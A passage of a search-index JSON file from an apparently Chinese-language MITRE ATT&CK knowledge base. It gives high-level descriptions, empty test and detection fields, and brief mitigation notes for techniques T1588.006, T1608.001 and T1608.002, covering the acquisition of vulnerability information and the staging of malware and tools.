https://attack.mitre.org/techniques/T1588/006/","title":"T1588-006-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#t1588-006-","text":"","title":"T1588-006-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u5f97\u6709\u5173\u6f0f\u6d1e\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u7684\u65b9\u6cd5\u65f6\u4f7f\u7528\u3002\u6f0f\u6d1e\u662f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u4e2d\u7684\u4e00\u4e2a\u5f31\u70b9\uff0c\u5b83\u6709\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u5bfc\u81f4\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5f00\u653e\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6216\u8fdb\u5165\u5c01\u95ed\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6765\u5bfb\u627e\u6f0f\u6d1e\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u76d1\u89c6\u6f0f\u6d1e\u62ab\u9732\u6570\u636e\u5e93\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u51b5\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u628a\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u7684\u7cfb\u7edf\u4f5c\u4e3a\u76ee\u6807\uff08\u5305\u62ec\u5546\u4e1a\u4f9b\u5e94\u5546\uff09\u3002\u5bf9\u6f0f\u6d1e\u7684\u4e86\u89e3\u53ef\u80fd\u4f1a\u4f7f\u653b\u51fb\u8005\u5bfb\u627e\u73b0\u6709\u7684\u6f0f\u6d1e\u6216\u8bd5\u56fe\u81ea\u5df1\u6316\u6398\u51fa\u4e00\u4e2a\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_8","text":"\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4fa7\u91cd\u4e8e\u4e0e\u6f0f\u6d1e\u5229\u7528\u7684\u6f5c\u5728\u4f7f\u7528\u76f8\u5173\u7684\u884c\u4e3a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u636e\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\uff0c\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u5f00\u53d1\uff09","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_9","text":"MITRE-ATT&CK-T1588-006 https://attack.mitre.org/techniques/T1588/006/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","text":"T1608-001-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6076\u610f\u8f6f\u4ef6\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u53ef\u4ee5\u8bbf\u95ee\u3002\u6076\u610f\u8f6f\u4ef6\u53ef\u4ee5\u5305\u62ec\u6709\u6548\u8f7d\u8377\u3001\u8bf1\u9975\u3001\u540e\u6e17\u900f\u5de5\u5177\u3001\u540e\u95e8\u548c\u5176\u4ed6\u5404\u79cd\u6076\u610f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u6709\u6548\u8f7d\u8377\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u4f7f\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002 \u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u4ee5\u524d\u88ab\u653b\u51fb\u8005\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u88ab\u4ed6\u4eec\u7834\u574f\u7684\u57fa\u7840\u8bbe\u65bd\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u6076\u610f\u8f6f\u4ef6\u4e5f\u53ef\u4ee5\u653e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u5982GitHub\u6216Pastebin\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5907\u4efd\u6587\u4ef6\uff0c\u5982\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u865a\u62df\u673a\u56fe\u50cf\u6216\u5bb9\u5668\u56fe\u50cf\uff0c\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5546\u5e97\u6216\u5b58\u50a8\u5e93\uff08\u4f8b\u5982\uff1aGitHub\u3001CNET\u3001AWS\u793e\u533aAMI\u3001Docker Hub\uff09\u3002\u5076\u7136\u7684\u673a\u4f1a\uff0c\u53d7\u5bb3\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u7528\u6237\u6267\u884c\u76f4\u63a5\u4e0b\u8f7d\u6216\u5b89\u88c5\u8fd9\u4e9b\u88ab\u53cd\u5c4f\u853d\u7684\u6587\u4ef6\u3002\u5de7\u5999\u7684\u4f2a\u88c5\u53ef\u80fd\u4f1a\u589e\u52a0\u7528\u6237\u9519\u8bef\u5730\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\u7684\u673a\u4f1a\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u7834\u574f\u540e\u9636\u6bb5\uff0c\u5982\u7528\u6237\u6267\u884c\u6216\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1608-001 https://attack.mitre.org/techniques/T1608/001/","title":"T1608-001-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#t1608-001-","text":"","title":"T1608-001-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6076\u610f\u8f6f\u4ef6\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u53ef\u4ee5\u8bbf\u95ee\u3002\u6076\u610f\u8f6f\u4ef6\u53ef\u4ee5\u5305\u62ec\u6709\u6548\u8f7d\u8377\u3001\u8bf1\u9975\u3001\u540e\u6e17\u900f\u5de5\u5177\u3001\u540e\u95e8\u548c\u5176\u4ed6\u5404\u79cd\u6076\u610f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u6709\u6548\u8f7d\u8377\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u4f7f\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002 \u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u4ee5\u524d\u88ab\u653b\u51fb\u8005\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u88ab\u4ed6\u4eec\u7834\u574f\u7684\u57fa\u7840\u8bbe\u65bd\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u6076\u610f\u8f6f\u4ef6\u4e5f\u53ef\u4ee5\u653e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u5982GitHub\u6216Pastebin\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5907\u4efd\u6587\u4ef6\uff0c\u5982\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u865a\u62df\u673a\u56fe\u50cf\u6216\u5bb9\u5668\u56fe\u50cf\uff0c\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5546\u5e97\u6216\u5b58\u50a8\u5e93\uff08\u4f8b\u5982\uff1aGitHub\u3001CNET\u3001AWS\u793e\u533aAMI\u3001Docker Hub\uff09\u3002\u5076\u7136\u7684\u673a\u4f1a\uff0c\u53d7\u5bb3\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u7528\u6237\u6267\u884c\u76f4\u63a5\u4e0b\u8f7d\u6216\u5b89\u88c5\u8fd9\u4e9b\u88ab\u53cd\u5c4f\u853d\u7684\u6587\u4ef6\u3002\u5de7\u5999\u7684\u4f2a\u88c5\u53ef\u80fd\u4f1a\u589e\u52a0\u7528\u6237\u9519\u8bef\u5730\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\u7684\u673a\u4f1a\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u7834\u574f\u540e\u9636\u6bb5\uff0c\u5982\u7528\u6237\u6267\u884c\u6216\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_9","text":"MITRE-ATT&CK-T1608-001 https://attack.mitre.org/techniques/T1608/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/","text":"T1608-002-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u5de5\u5177 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u76ee\u6807\u653b\u51fb\u671f\u95f4\u53ef\u4ee5\u4f7f\u7528\u3002\u5de5\u5177\u53ef\u4ee5\u662f\u5f00\u653e\u6216\u95ed\u6e90\u7684\uff0c\u514d\u8d39\u6216\u5546\u4e1a\u7684\u3002\u5de5\u5177\u53ef\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u6076\u610f\u76ee\u7684\uff0c\u4f46\u8fd9\u4e9b\u5de5\u5177\u7684\u8bbe\u8ba1\u521d\u8877\uff08\u4e0e\u6076\u610f\u8f6f\u4ef6\u4e0d\u540c\uff09\u5e76\u4e0d\u6253\u7b97\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\uff08\u4f8b\u5982\uff1aPsExec\uff09\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u5de5\u5177\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u5de5\u5177\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u8ba9\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u5b9e\u73b0\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002 \u5de5\u5177\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u653b\u51fb\u8005\u4e4b\u524d\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u8005\u88ab\u4ed6\u4eec\u4ee5\u5176\u4ed6\u65b9\u5f0f\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u5de5\u5177\u4e5f\u53ef\u4ee5\u88ab\u653e\u7f6e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u4f8b\u5982\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub repo\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8ba9\u88ab\u653b\u51fb\u7684\u53d7\u5bb3\u8005\u673a\u5668\u76f4\u63a5\u4ece\u7b2c\u4e09\u65b9\u6258\u7ba1\u4f4d\u7f6e\uff08\u4f8b\u5982\uff1a\u975e\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub repo\uff09\u4e0b\u8f7d\u5de5\u5177\uff0c\u5305\u62ec\u5de5\u5177\u7684\u539f\u59cb\u6258\u7ba1\u7f51\u7ad9\uff0c\u6765\u907f\u514d\u4e0a\u4f20\u5de5\u5177\u7684\u9700\u8981\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u5982\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1608-002 https://attack.mitre.org/techniques/T1608/002/","title":"T1608-002-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u5de5\u5177"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#t1608-002-","text":"","title":"T1608-002-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u5de5\u5177"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u76ee\u6807\u653b\u51fb\u671f\u95f4\u53ef\u4ee5\u4f7f\u7528\u3002\u5de5\u5177\u53ef\u4ee5\u662f\u5f00\u653e\u6216\u95ed\u6e90\u7684\uff0c\u514d\u8d39\u6216\u5546\u4e1a\u7684\u3002\u5de5\u5177\u53ef\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u6076\u610f\u76ee\u7684\uff0c\u4f46\u8fd9\u4e9b\u5de5\u5177\u7684\u8bbe\u8ba1\u521d\u8877\uff08\u4e0e\u6076\u610f\u8f6f\u4ef6\u4e0d\u540c\uff09\u5e76\u4e0d\u6253\u7b97\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\uff08\u4f8b\u5982\uff1aPsExec\uff09\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u5de5\u5177\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u5de5\u5177\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u8ba9\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u5b9e\u73b0\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002 \u5de5\u5177\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u653b\u51fb\u8005\u4e4b\u524d\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u8005\u88ab\u4ed6\u4eec\u4ee5\u5176\u4ed6\u65b9\u5f0f\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u5de5\u5177\u4e5f\u53ef\u4ee5\u88ab\u653e\u7f6e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u4f8b\u5982\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub repo\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8ba9\u88ab\u653b\u51fb\u7684\u53d7\u5bb3\u8005\u673a\u5668\u76f4\u63a5\u4ece\u7b2c\u4e09\u65b9\u6258\u7ba1\u4f4d\u7f6e\uff08\u4f8b\u5982\uff1a\u975e\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub 